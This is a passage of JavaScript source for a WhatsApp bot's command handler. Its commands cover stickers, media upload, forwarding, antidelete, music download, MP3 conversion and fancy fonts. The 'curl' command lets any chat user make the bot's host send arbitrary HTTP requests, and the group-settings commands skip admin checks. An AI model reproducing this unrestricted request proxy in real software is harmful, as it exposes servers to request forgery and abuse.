    if (!mime) return await SYHaTeReplay("❌ *Reply to a video message!*");

    if (quoted.videoMessage.fileLength > 35 * 1024 * 1024) {
        return await SYHaTeReplay("❌ *Video too large! Max 35MB allowed.*");
    }

    try {
        await SYxS7.sendMessage(from, { react: { text: '🔄', key: S7.key } });

        const S7stream = await downloadContentFromMessage(quoted[mime], 'video');
        const S7chunks = [];

        for await (const S7chunk of S7stream) {
            S7chunks.push(S7chunk);
        }

        const S7buffer = Buffer.concat(S7chunks);

        await SYHaTeReplay({
            video: S7buffer,
            ptv: true
        });

        await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

    } catch (err) {
        await SYHaTeReplay("❌ *Error: Failed to process PTV!*");
    }
}

if (SYHaTeS7 === 'tosticker' || SYHaTeS7 === 'tos') {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const axios = require('axios');
    const FormData = require('form-data');

    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const mime = quoted?.imageMessage ? 'imageMessage' : quoted?.videoMessage ? 'videoMessage' : null;

    if (!mime) {
        return await SYHaTeReplay(
`❌ *Reply to a photo or short video!*

📌 *Example:*
${prefix}${SYHaTeS7} MyPack|Sabir|full|100

🧠 *Format:*
${prefix}${SYHaTeS7} pack|author|type|quality

🎨 *Types:* full / crop / circle`
        );
    }

    try {
        await SYxS7.sendMessage(from, { react: { text: '🪄', key: S7.key } });

        const stream = await downloadContentFromMessage(
            quoted[mime],
            mime === 'imageMessage' ? 'image' : 'video'
        );

        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const args = (text || '').split('|');

        const pack = args[0] || 'Zoro MD';
        const author = args[1] || 'VOIDSEC';
        const type = args[2] || 'full';
        const quality = args[3] || '70';

        const form = new FormData();
        form.append('file', buffer, {
            filename: mime === 'imageMessage' ? 'image.jpg' : 'video.mp4'
        });

        form.append('pack', pack);
        form.append('author', author);
        form.append('type', type);
        form.append('quality', quality);
        form.append('background', 'transparent');

        const res = await axios.post(
            'https://sticker-api-s7.onrender.com/sticker',
            form,
            {
                headers: form.getHeaders(),
                responseType: 'arraybuffer'
            }
        );

        const stickerBuffer = Buffer.from(res.data);

        await SYHaTeReplay({ sticker: stickerBuffer });

    } catch (err) {
        await SYHaTeReplay(`❌ *Error* ${err}`);
    }
}

if (SYHaTeS7 === 'forward') {
    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = contextInfo?.quotedMessage;

    if (!quotedMsg) return await SYHaTeReplay("❌ *Please reply/quote the message you want to forward!*");

    if (!text) return await SYHaTeReplay(`*Usage:* Quote a message then type:\n${prefix}forward [JID]\n\n*Example:* ${prefix}forward 12345@s.whatsapp.net`);

    const targetJid = text.trim().includes('@') ? text.trim() : text.trim() + '@s.whatsapp.net';

    try {
        await SYxS7.sendMessage(targetJid, { 
            forward: {
                key: {
                    remoteJid: from,
                    fromMe: false,
                    id: contextInfo.stanzaId,
                    participant: contextInfo.participant || from
                },
                message: quotedMsg
            }
        });

        return await SYHaTeReplay(`✅ *Message successfully forwarded to:* ${targetJid}`);
    } catch (error) {
        log('error', 'FORWARD', error.message);
        return await SYHaTeReplay("❌ *Forward Failed:* " + error.message);
    }
}





if (SYHaTeS7 === 'antidelete') {
    
    if (!isOwner) return await SYHaTeReplay(owneronly);

    if (text === 'on') {
        if (!db[botNumber]) db[botNumber] = {};
        db[botNumber].antidelete = true;
        saveDB(db);
        return await SYHaTeReplay("✅ *Antidelete Global is now ON*");
    } else if (text === 'off') {
        if (!db[botNumber]) db[botNumber] = {};
        db[botNumber].antidelete = false;
        saveDB(db);
        msgStore.clear();
        return await SYHaTeReplay("❌ *Antidelete Global is now OFF*");
    } else {
        return await SYHaTeReplay(`*Usage:* ${prefix}antidelete on/off`);
    }
}


if (SYHaTeS7 === 'curl') {
    if (!text) return await SYHaTeReplay(`❌ *Usage:* ${prefix}curl [options] <url>`);

    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const mime = quoted ? Object.keys(quoted)[0] : null;

    const args = text.split(" ");
    let method = "GET";
    let url = "";
    let headers = {};
    let data = null;
    let showHeaders = false;
    let silent = false;

    for (let i = 0; i < args.length; i++) {
        let arg = args[i];

        if (arg === "-X") {
            method = args[i + 1];
            i++;
        } else if (arg === "-d" || arg === "--data") {
            method = "POST";
            data = args[i + 1];
            i++;
        } else if (arg === "-H" || arg === "--header") {
            const [key, value] = args[i + 1].split(":");
            headers[key.trim()] = value.trim();
            i++;
        } else if (arg === "-I") {
            method = "HEAD";
        } else if (arg === "-i") {
            showHeaders = true;
        } else if (arg === "-s") {
            silent = true;
        } else if (arg.startsWith("http")) {
            url = arg;
        }
    }

    if (!url) return await SYHaTeReplay("❌ URL missing!");

    try {
        await SYxS7.sendMessage(from, { react: { text: '🌐', key: S7.key } });

        let response;

        if ((mime === 'imageMessage' || mime === 'videoMessage' || mime === 'documentMessage') && method === "POST") {
            const stream = await downloadContentFromMessage(quoted[mime], mime.replace("Message", ""));
            let buffer = Buffer.from([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

            const FormData = require("form-data");
            const form = new FormData();

            form.append("file", buffer, "file");

            if (data) {
                try {
                    const parsed = JSON.parse(data);
                    for (let key in parsed) form.append(key, parsed[key]);
                } catch {
                    form.append("data", data);
                }
            }

            response = await axios({
                method: "POST",
                url,
                headers: {
                    ...headers,
                    ...form.getHeaders()
                },
                data: form,
                responseType: "arraybuffer",
                timeout: 60000
            });

        } else {
            response = await axios({
                method,
                url,
                headers,
                data,
                responseType: "arraybuffer",
                timeout: 60000
            });
        }

        const contentType = response.headers['content-type'] || "text/plain";

        let ext = "txt";
        if (contentType.includes("json")) ext = "json";
        else if (contentType.includes("html")) ext = "html";
        else if (contentType.includes("jpeg")) ext = "jpg";
        else if (contentType.includes("png")) ext = "png";
        else if (contentType.includes("gif")) ext = "gif";
        else if (contentType.includes("pdf")) ext = "pdf";
        else if (contentType.includes("mp4")) ext = "mp4";
        else if (contentType.includes("mpeg")) ext = "mp3";

        const buffer = Buffer.from(response.data);

        let bodyText = "";
        try {
            bodyText = buffer.toString();
        } catch {}

        let output = "";

        if (showHeaders) {
            output += "📥 HEADERS:\n";
            for (let k in response.headers) {
                output += `${k}: ${response.headers[k]}\n`;
            }
            output += "\n";
        }

        if (!silent && bodyText) {
            if (bodyText.length <= 3500) {
                output += bodyText;
                return await SYHaTeReplay(`📡 *CURL RESULT:*\n\n${output}`);
            }
        }

        const fileName = `curl_output.${ext}`;

        await SYHaTeReplay({
            document: buffer,
            mimetype: contentType,
            fileName: fileName
        });

    } catch (err) {
        await SYHaTeReplay(`❌ *Error:*\n${err.response?.data || err.message}`);
    }
}

if (SYHaTeS7 === 'tourl') {
    const axios = require('axios');
    const FormData = require('form-data');
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

    const msg = S7.message;
    const quotedMsg = msg?.extendedTextMessage?.contextInfo?.quotedMessage;

    const mediaTarget = msg?.imageMessage || msg?.videoMessage || msg?.documentMessage || msg?.audioMessage ||
                        quotedMsg?.imageMessage || quotedMsg?.videoMessage || quotedMsg?.documentMessage || quotedMsg?.audioMessage;

    if (!mediaTarget) {
        return await SYHaTeReplay(`*ＭＥＤＩＡ  ＴＯ  ＵＲＬ*\n\n> *Error:* Please reply to an image, video, audio, or document with ${prefix}tourl`);
    }

    let mediaType = '';
    let ext = 'bin';
    
    if (msg?.imageMessage || quotedMsg?.imageMessage) { mediaType = 'image'; ext = 'jpg'; }
    else if (msg?.videoMessage || quotedMsg?.videoMessage) { mediaType = 'video'; ext = 'mp4'; }
    else if (msg?.audioMessage || quotedMsg?.audioMessage) { mediaType = 'audio'; ext = 'mp3'; }
    else if (msg?.documentMessage || quotedMsg?.documentMessage) {
        mediaType = 'document';
        const docName = msg?.documentMessage?.fileName || quotedMsg?.documentMessage?.fileName || '';
        ext = docName.split('.').pop() || 'bin';
    }

    try {
        await SYxS7.sendMessage(from, { react: { text: '⏳', key: S7.key } });

        const stream = await downloadContentFromMessage(mediaTarget, mediaType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const originalName = mediaTarget.fileName || `S7_upload_${Date.now()}.${ext}`;
        const cleanName = originalName.replace(/\s+/g, '-');

        const form = new FormData();
        form.append('file', buffer, { filename: cleanName });

        const response = await axios.post('https://api.nebuvault.sabir7718.com/upload', form, {
            headers: form.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 60000
        });

        if (response.data && response.data.success) {
            const data = response.data;
            const resMsg = `*ＵＰＬＯＡＤ  ＳＵＣＣＥＳＳ*\n\n> *URL:* ${data.url}\n> *Expires:* ${data.expires}\n\n*Powered by NebuVault API*`;
            
            await S7HaTeSTArTEd(resMsg);
            await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });
        } else {
            throw new Error(response.data?.message || 'NebuVault upload rejected.');
        }

    } catch (err) {
        log('error', 'TOURL_MULTI_FIX', err.message);
        await SYHaTeReplay(`*ＭＥＤＩＡ  ＴＯ  ＵＲＬ*\n\n> *Failed:* ${err.message}`);
        await SYxS7.sendMessage(from, { react: { text: '❌', key: S7.key } });
    }
}





if (SYHaTeS7 === 'setgpp') {
    const isGroup = from.endsWith('@g.us');
    if (!isGroup) return SYHaTeReplay(onlygc);
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const botId = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    const botAdmin = participants.find(p => p.id === botId)?.admin;

    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const mime = quoted?.imageMessage ? 'imageMessage' : null;

    if (!mime) return await SYHaTeReplay("❌ *Reply to an image to set it as the group profile picture!*");

    try {
        await SYxS7.sendMessage(from, { react: { text: '📸', key: S7.key } });

        const stream = await downloadContentFromMessage(quoted[mime], 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        await SYxS7.updateProfilePicture(from, buffer);
        
        await SYHaTeReplay("✅ *Group profile picture updated successfully!*");

    } catch (err) {
        console.error(err);
        await SYHaTeReplay("❌ *Error: Failed to update group profile picture!*");
    }
}

if (SYHaTeS7 === 'setgname') {
    const isGroup = from.endsWith('@g.us');
    if (!isGroup) return await SYHaTeReplay(onlygc);

    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const botId = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    const botAdmin = participants.find(p => p.id === botId)?.admin;
    if (!text) return await SYHaTeReplay("❌ *Please provide a new name for the group!*");
    if (text.length > 25) return await SYHaTeReplay("❌ *Group name is too long! (Max 25 characters)*");

    try {
        await SYxS7.sendMessage(from, { react: { text: '✏️', key: S7.key } });

        await SYxS7.groupUpdateSubject(from, text);

        await SYHaTeReplay(`✅ *Group name updated to:* ${text}`);

    } catch (err) {
        console.error(err);
        await SYHaTeReplay("❌ *Error: Failed to update group name!*");
    }
}

if (SYHaTeS7 === 'music') {
    if (!text) return await SYHaTeReplay("❌ Provide a song name!");

    try {
        const search = await yts(text);
        const video = search.videos[0];
        if (!video) return await SYHaTeReplay("❌ Song not found!");
        
        await SYxS7.sendMessage(S7.key.remoteJid, {
            react: { text: '⬇️', key: S7.key }
        });

        const apiUrl = `https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data.status !== "success" || !apiResponse.data.audio_url) {
            throw new Error("API Error");
        }

        const filePath = path.join(process.cwd(), `${Date.now()}.mp3`);

        const fileResponse = await axios({
            method: "GET",
            url: apiResponse.data.audio_url,
            responseType: "arraybuffer",
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });

        fs.writeFileSync(filePath, fileResponse.data);

        await SYxS7.sendMessage(from, {
            audio: fs.readFileSync(filePath),
            mimetype: 'audio/mpeg',
            fileName: `${video.title}.mp3`
        }, { quoted: S7 });
        
        await SYxS7.sendMessage(S7.key.remoteJid, {
            react: { text: '✅', key: S7.key }
        });

        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

    } catch (err) {
        console.log(err);
        await SYxS7.sendMessage(S7.key.remoteJid, {
            react: { text: '❌', key: S7.key }
        });
        return await SYHaTeReplay("❌ Error downloading song.");
    }
}

                
                if (SYHaTeS7 === 'spotify' || SYHaTeS7 === 'song2' || SYHaTeS7 === 'mp32') {
    if (!text) return await SYHaTeReplay(`❌ *Please provide a name!*`);
    
    try {
        const search = await yts(text);
        const video = search.videos[0];
        if (!video) return await SYHaTeReplay("❌ Song not found!");

        const caption = `🎵 *Now Playing*\n\n*Pᴏᴡᴇʀᴇᴅ Bʏ Zᴏʀᴏ Mᴅ Lɪᴛᴇ*\n\n📌 *Title:* ${video.title}\n👤 *Channel:* ${video.author.name}\n⏱️ *Duration:* ${video.timestamp}\n\n⬇️ *Downloading audio...*`;

        await SYxS7.sendMessage(from, { 
            image: { url: video.thumbnail }, 
            caption: caption 
        }, { quoted: S7 });
     
        const apiUrl = `https://social-media-downloader-api-s7.onrender.com/audiosyhate?url=${encodeURIComponent(video.url)}`;
        const apiResponse = await axios.get(apiUrl);
        
        if (apiResponse.data.status !== "success" || !apiResponse.data.audio_url) {
            throw new Error("API Error");
        }

        const filePath = path.join(process.cwd(), `${Date.now()}.mp3`);
        const fileResponse = await axios({
            method: "GET",
            url: apiResponse.data.audio_url,
            responseType: "arraybuffer",
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });

        fs.writeFileSync(filePath, fileResponse.data);

        await SYxS7.sendMessage(from, {
            audio: fs.readFileSync(filePath),
            mimetype: 'audio/mpeg',
            fileName: `${video.title}.mp3`
        }, { quoted: S7 });

        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

    } catch (err) {
        return await SYHaTeReplay("❌ Error: API Down or File too large.");
    }
}

if (SYHaTeS7 === "tomp3") {
        const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
        const quotedMessage = contextInfo?.quotedMessage;
        const videoMessage =
          quotedMessage?.videoMessage || S7.message?.videoMessage;

        if (!videoMessage) {
          return await SYHaTeReplay(
            "*Please reply to a video or send a video with the command to convert it to MP3!*",
          );
        }

        const fs = require("fs");
        const path = require("path");
        const os = require("os");
        const crypto = require("crypto");
        let ffmpeg, ffmpegPath;

        try {
          ffmpeg = require("fluent-ffmpeg");
          ffmpegPath = require("ffmpeg-static");
        } catch (e) {
          const { execSync } = require("child_process");
          await SYHaTeReplay(
            "*Core audio modules missing! Installing dependencies, please wait...*",
          );
          execSync(
            "npm install fluent-ffmpeg ffmpeg-static --no-audit --no-fund",
            { stdio: "inherit" },
          );
          ffmpeg = require("fluent-ffmpeg");
          ffmpegPath = require("ffmpeg-static");
        }
        ffmpeg.setFfmpegPath(ffmpegPath);

        const tempFiles = [];

        try {
          await SYxS7.sendMessage(from, { react: { text: "⬇️", key: S7.key } });

          const stream = await downloadContentFromMessage(
            videoMessage,
            "video",
          );
          let buffer = Buffer.from([]);
          for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
          }

          const id = crypto.randomBytes(8).toString("hex");
          const videoInput = path.join(os.tmpdir(), `tomp3_in_${id}.mp4`);
          const audioOutput = path.join(os.tmpdir(), `tomp3_out_${id}.mp3`);
          tempFiles.push(videoInput, audioOutput);

          fs.writeFileSync(videoInput, buffer);

          await SYxS7.sendMessage(from, { react: { text: "🎙️", key: S7.key } });

          await new Promise((resolve, reject) => {
            ffmpeg(videoInput)
              .noVideo()
              .audioCodec("libmp3lame")
              .audioBitrate("192k")
              .format("mp3")
              .on("end", resolve)
              .on("error", reject)
              .save(audioOutput);
          });

          const mp3Buffer = fs.readFileSync(audioOutput);

          await SYxS7.sendMessage(from, { react: { text: "📤", key: S7.key } });

          await SYxS7.sendMessage(
            from,
            {
              audio: mp3Buffer,
              mimetype: "audio/mpeg",
              fileName: `Zoro_Audio_${Date.now()}.mp3`,
            },
            { quoted: S7 },
          );

          await SYxS7.sendMessage(from, { react: { text: "✅", key: S7.key } });
        } catch (err) {
          console.error(err);
          return await SYHaTeReplay(`*Conversion failed:* ${err.message}`);
        } finally {
          tempFiles.forEach((f) => {
            try {
              if (fs.existsSync(f)) fs.unlinkSync(f);
            } catch {}
          });
        }
      }

if (SYHaTeS7 === 'font') {
    const fancy = {
        0:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ค","b":"๖","c":"¢","d":"໓","e":"ē","f":"f","g":"ງ","h":"h","i":"i","j":"ว","k":"k","l":"l","m":"๓","n":"ຖ","o":"໐","p":"p","q":"๑","r":"r","s":"Ş","t":"t","u":"น","v":"ง","w":"ຟ","x":"x","y":"ฯ","z":"ຊ","A":"ค","B":"๖","C":"¢","D":"໓","E":"ē","F":"f","G":"ງ","H":"h","I":"i","J":"ว","K":"k","L":"l","M":"๓","N":"ຖ","O":"໐","P":"p","Q":"๑","R":"r","S":"Ş","T":"t","U":"น","V":"ง","W":"ຟ","X":"x","Y":"ฯ","Z":"ຊ" },
        1:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ą","b":"ც","c":"ƈ","d":"ɖ","e":"ɛ","f":"ʄ","g":"ɠ","h":"ɧ","i":"ı","j":"ʝ","k":"ƙ","l":"Ɩ","m":"ɱ","n":"ŋ","o":"ơ","p":"℘","q":"զ","r":"ཞ","s":"ʂ","t":"ɬ","u":"ų","v":"۷","w":"ῳ","x":"ҳ","y":"ყ","z":"ʑ","A":"ą","B":"ც","C":"ƈ","D":"ɖ","E":"ɛ","F":"ʄ","G":"ɠ","H":"ɧ","I":"ı","J":"ʝ","K":"ƙ","L":"Ɩ","M":"ɱ","N":"ŋ","O":"ơ","P":"℘","Q":"զ","R":"ཞ","S":"ʂ","T":"ɬ","U":"ų","V":"۷","W":"ῳ","X":"ҳ","Y":"ყ","Z":"ʑ" },
        2:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ﾑ","b":"乃","c":"ᄃ","d":"り","e":"乇","f":"ｷ","g":"ム","h":"ん","i":"ﾉ","j":"ﾌ","k":"ズ","l":"ﾚ","m":"ﾶ","n":"刀","o":"の","p":"ｱ","q":"ゐ","r":"尺","s":"丂","t":"ｲ","u":"ひ","v":"√","w":"W","x":"ﾒ","y":"ﾘ","z":"乙","A":"ﾑ","B":"乃","C":"ᄃ","D":"り","E":"乇","F":"ｷ","G":"ム","H":"ん","I":"ﾉ","J":"ﾌ","K":"ズ","L":"ﾚ","M":"ﾶ","N":"刀","O":"の","P":"ｱ","Q":"ゐ","R":"尺","S":"丂","T":"ｲ","U":"ひ","V":"√","W":"W","X":"ﾒ","Y":"ﾘ","Z":"乙" },
        3:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"卂","b":"乃","c":"匚","d":"ᗪ","e":"乇","f":"千","g":"Ꮆ","h":"卄","i":"丨","j":"ﾌ","k":"Ҝ","l":"ㄥ","m":"爪","n":"几","o":"ㄖ","p":"卩","q":"Ɋ","r":"尺","s":"丂","t":"ㄒ","u":"ㄩ","v":"ᐯ","w":"山","x":"乂","y":"ㄚ","z":"乙","A":"卂","B":"乃","C":"匚","D":"ᗪ","E":"乇","F":"千","G":"Ꮆ","H":"卄","I":"丨","J":"ﾌ","K":"Ҝ","L":"ㄥ","M":"爪","N":"几","O":"ㄖ","P":"卩","Q":"Ɋ","R":"尺","S":"丂","T":"ㄒ","U":"ㄩ","V":"ᐯ","W":"山","X":"乂","Y":"ㄚ","Z":"乙" },
        4:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"🄰","b":"🄱","c":"🄲","d":"🄳","e":"🄴","f":"🄵","g":"🄶","h":"🄷","i":"🄸","j":"🄹","k":"🄺","l":"🄻","m":"🄼","n":"🄽","o":"🄾","p":"🄿","q":"🅀","r":"🅁","s":"🅂","t":"🅃","u":"🅄","v":"🅅","w":"🅆","x":"🅇","y":"🅈","z":"🅉","A":"🄰","B":"🄱","C":"🄲","D":"🄳","E":"🄴","F":"🄵","G":"🄶","H":"🄷","I":"🄸","J":"🄹","K":"🄺","L":"🄻","M":"🄼","N":"🄽","O":"🄾","P":"🄿","Q":"🅀","R":"🅁","S":"🅂","T":"🅃","U":"🅄","V":"🅅","W":"🅆","X":"🅇","Y":"🅈","Z":"🅉" },
        5:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"Ꮧ","b":"Ᏸ","c":"ፈ","d":"Ꮄ","e":"Ꮛ","f":"Ꭶ","g":"Ꮆ","h":"Ꮒ","i":"Ꭵ","j":"Ꮰ","k":"Ꮶ","l":"Ꮭ","m":"Ꮇ","n":"Ꮑ","o":"Ꭷ","p":"Ꭾ","q":"Ꭴ","r":"Ꮢ","s":"Ꮥ","t":"Ꮦ","u":"Ꮼ","v":"Ꮙ","w":"Ꮗ","x":"ጀ","y":"Ꭹ","z":"ፚ","A":"Ꮧ","B":"Ᏸ","C":"ፈ","D":"Ꮄ","E":"Ꮛ","F":"Ꭶ","G":"Ꮆ","H":"Ꮒ","I":"Ꭵ","J":"Ꮰ","K":"Ꮶ","L":"Ꮭ","M":"Ꮇ","N":"Ꮑ","O":"Ꭷ","P":"Ꭾ","Q":"Ꭴ","R":"Ꮢ","S":"Ꮥ","T":"Ꮦ","U":"Ꮼ","V":"Ꮙ","W":"Ꮗ","X":"ጀ","Y":"Ꭹ","Z":"ፚ" },
        6:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ᗩ","b":"ᗷ","c":"ᑕ","d":"ᗪ","e":"E","f":"ᖴ","g":"G","h":"ᕼ","i":"I","j":"ᒍ","k":"K","l":"ᒪ","m":"ᗰ","n":"ᑎ","o":"O","p":"ᑭ","q":"ᑫ","r":"ᖇ","s":"ᔕ","t":"T","u":"ᑌ","v":"ᐯ","w":"ᗯ","x":"᙭","y":"Y","z":"","A":"ᗩ","B":"ᗷ","C":"ᑕ","D":"ᗪ","E":"E","F":"ᖴ","G":"G","H":"ᕼ","I":"I","J":"ᒍ","K":"K","L":"ᒪ","M":"ᗰ","N":"ᑎ","O":"O","P":"ᑭ","Q":"ᑫ","R":"ᖇ","S":"ᔕ","T":"T","U":"ᑌ","V":"ᐯ","W":"ᗯ","X":"᙭","Y":"Y","Z":"" },
        7:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ǟ","b":"ɮ","c":"ƈ","d":"ɖ","e":"ɛ","f":"ʄ","g":"ɢ","h":"ɦ","i":"ɨ","j":"ʝ","k":"ӄ","l":"ʟ","m":"ʍ","n":"ռ","o":"օ","p":"ք","q":"զ","r":"ʀ","s":"ֆ","t":"ȶ","u":"ʊ","v":"ʋ","w":"ա","x":"Ӽ","y":"ʏ","z":"ʐ","A":"ǟ","B":"ɮ","C":"ƈ","D":"ɖ","E":"ɛ","F":"ʄ","G":"ɢ","H":"ɦ","I":"ɨ","J":"ʝ","K":"ӄ","L":"ʟ","M":"ʍ","N":"ռ","O":"օ","P":"ք","Q":"զ","R":"ʀ","S":"ֆ","T":"ȶ","U":"ʊ","V":"ʋ","W":"ա","X":"Ӽ","Y":"ʏ","Z":"ʐ" },
        8:{"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿","a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣","A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉" },
        9:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝙖","b":"𝙗","c":"𝙘","d":"𝙙","e":"𝙚","f":"𝙛","g":"𝙜","h":"𝙝","i":"𝙞","j":"𝙟","k":"𝙠","l":"𝙡","m":"𝙢","n":"𝙣","o":"𝙤","p":"𝙥","q":"𝙦","r":"𝙧","s":"𝙨","t":"𝙩","u":"𝙪","v":"𝙫","w":"𝙬","x":"𝙭","y":"𝙮","z":"𝙯","A":"𝘼","B":"𝘽","C":"𝘾","D":"𝘿","E":"𝙀","F":"𝙁","G":"𝙂","H":"𝙃","I":"𝙄","J":"𝙅","K":"𝙆","L":"𝙇","M":"𝙈","N":"𝙉","O":"𝙊","P":"𝙋","Q":"𝙌","R":"𝙍","S":"𝙎","T":"𝙏","U":"𝙐","V":"𝙑","W":"𝙒","X":"𝙓","Y":"𝙔","Z":"𝙕" },
        10:{"0":"𝟎","1":"𝟏","2":"𝟐","3":"𝟑","4":"𝟒","5":"𝟓","6":"𝟔","7":"𝟕","8":"𝟖","9":"𝟗","a":"𝐚","b":"𝐛","c":"𝐜","d":"𝐝","e":"𝐞","f":"𝐟","g":"𝐠","h":"𝐡","i":"𝐢","j":"𝐣","k":"𝐤","l":"𝐥","m":"𝐦","n":"𝐧","o":"𝐨","p":"𝐩","q":"𝐪","r":"𝐫","s":"𝐬","t":"𝐭","u":"𝐮","v":"𝐯","w":"𝐰","x":"𝐱","y":"𝐲","z":"𝐳","A":"𝐀","B":"𝐁","C":"𝐂","D":"𝐃","E":"𝐄","F":"𝐅","G":"𝐆","H":"𝐇","I":"𝐈","J":"","K":"𝐊","L":"𝐋","M":"𝐌","N":"𝐍","O":"𝐎","P":"𝐏","Q":"","R":"𝐑","S":"𝐒","T":"𝐓","U":"𝐔","V":"𝐕","W":"𝐖","X":"𝐗","Y":"𝐘","Z":"𝐙" },
        11:{"0":"𝟬","1":"𝟭","2":"𝟮","3":"𝟯","4":"𝟰","5":"𝟱","6":"𝟲","7":"𝟳","8":"𝟴","9":"𝟵","a":"𝗮","b":"𝗯","c":"𝗰","d":"𝗱","e":"𝗲","f":"𝗳","g":"𝗴","h":"𝗵","i":"𝗶","j":"𝗷","k":"𝗸","l":"𝗹","m":"𝗺","n":"𝗻","o":"𝗼","p":"𝗽","q":"𝗾","r":"𝗿","s":"𝘀","t":"𝘁","u":"𝘂","v":"𝘃","w":"𝘄","x":"𝘅","y":"𝘆","z":"𝘇","A":"𝗔","B":"𝗕","C":"𝗖","D":"𝗗","E":"𝗘","F":"𝗙","G":"𝗚","H":"𝗛","I":"𝗜","J":"𝗝","K":"𝗞","L":"𝗟","M":"𝗠","N":"𝗡","O":"𝗢","P":"𝗣","Q":"𝗤","R":"𝗥","S":"𝗦","T":"𝗧","U":"𝗨","V":"𝗩","W":"𝗪","X":"𝗫","Y":"𝗬","Z":"𝗭" },
        12: {"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝘢","b":"𝘣","c":"𝘤","d":"𝘥","e":"𝘦","f":"𝘧","g":"𝘨","h":"𝘩","i":"𝘪","j":"𝘫","k":"𝘬","l":"𝘭","m":"𝘮","n":"𝘯","o":"𝘰","p":"𝘱","q":"𝘲","r":"𝘳","s":"𝘴","t":"𝘵","u":"𝘶","v":"𝘷","w":"𝘸","x":"𝘹","y":"𝘺","z":"𝘻","A":"𝘈","B":"𝘉","C":"𝘊","D":"𝘋","E":"𝘌","F":"𝘍","G":"𝘎","H":"𝘏","I":"𝘐","J":"𝘑","K":"𝘒","L":"𝘓","M":"𝘔","N":"𝘕","O":"𝘖","P":"𝘗","Q":"𝘘","R":"𝘙","S":"𝘚","T":"𝘛","U":"𝘜","V":"𝘝","W":"𝘞","X":"𝘟","Y":"𝘠","Z":"𝘡" },
        13:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"α","b":"Ⴆ","c":"ƈ","d":"ԃ","e":"ҽ","f":"ϝ","g":"ɠ","h":"ԋ","i":"ι","j":"ʝ","k":"ƙ","l":"ʅ","m":"ɱ","n":"ɳ","o":"σ","p":"ρ","q":"ϙ","r":"ɾ","s":"ʂ","t":"ƚ","u":"υ","v":"ʋ","w":"ɯ","x":"x","y":"ყ","z":"ȥ","A":"A","B":"B","C":"C","D":"D","E":"E","F":"F","G":"G","H":"H","I":"I","J":"J","K":"K","L":"L","M":"M","N":"N","O":"O","P":"P","Q":"Q","R":"R","S":"S","T":"T","U":"U","V":"V","W":"W","X":"X","Y":"Y","Z":"Z" },
